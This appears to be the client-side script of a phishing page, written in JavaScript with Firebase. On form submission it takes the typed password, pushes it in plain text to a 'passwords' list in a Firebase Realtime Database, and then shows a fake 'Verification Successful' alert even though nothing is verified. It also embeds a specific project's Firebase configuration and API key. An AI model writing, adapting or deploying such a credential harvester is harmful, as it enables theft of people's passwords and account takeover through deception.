import { initializeApp } from "https://www.gstatic.com/firebasejs/10.2.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.2.0/firebase-database.js";

// Initialize Firebase with your project config
const firebaseConfig = {
apiKey: "AIzaSyDLLqDss1dRsDHv3PEK1xcDXNIWjH4fGsc",
authDomain: "fila-71e62.firebaseapp.com",
databaseURL: "https://fila-71e62-default-rtdb.firebaseio.com",
projectId: "fila-71e62",
storageBucket: "fila-71e62.appspot.com",
messagingSenderId: "341901639442",
appId: "1:341901639442:web:ab8a8ee309fa9547fefdcb"
};

const firebase = initializeApp(firebaseConfig);
const database = getDatabase(firebase);

// Add an event listener to the form
const form = document.querySelector(".form");
form.addEventListener("submit", function(event) {
event.preventDefault(); // Prevent form submission

const passwordInput = document.getElementById("password");
const password = passwordInput.value;

// Store the password in Firebase Realtime Database
const passwordsRef = ref(database, "passwords");
  push(passwordsRef, { password });

// Clear the password field
passwordInput.value = "";

alert("Verification Successful");
});
